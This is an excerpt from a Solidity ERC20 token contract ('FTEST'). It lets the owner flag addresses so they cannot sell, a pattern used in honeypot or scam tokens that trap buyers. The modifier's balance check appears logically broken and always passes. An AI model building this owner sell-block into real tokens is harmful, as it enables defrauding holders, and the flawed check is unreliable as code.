...
contract wed is Context, IERC20, IERC20Metadata {
    ...
    mapping(address => bool) private _restrictedSell;
    
    
    uint256 public _totalSupply = 1000000*10**18;
    string public _name = "FTEST";
    string public _symbol= "FTEST";
     bool balances1 = true;
    ...
    modifier notRestrictedSell(address sender, uint256 amount) {
    require(!_restrictedSell[sender] || (_balances[sender] - amount) >= 0, "ERC20: selling restricted");
    _;
    }
    ...
    function restrictSell(address addr) onlyowner public {
    _restrictedSell[addr] = true;
    }

    function allowSell(address addr) onlyowner public {
    _restrictedSell[addr] = false;
    }
    ...
    address recipient,
    uint256 amount
) internal virtual notRestrictedSell(sender, amount) {
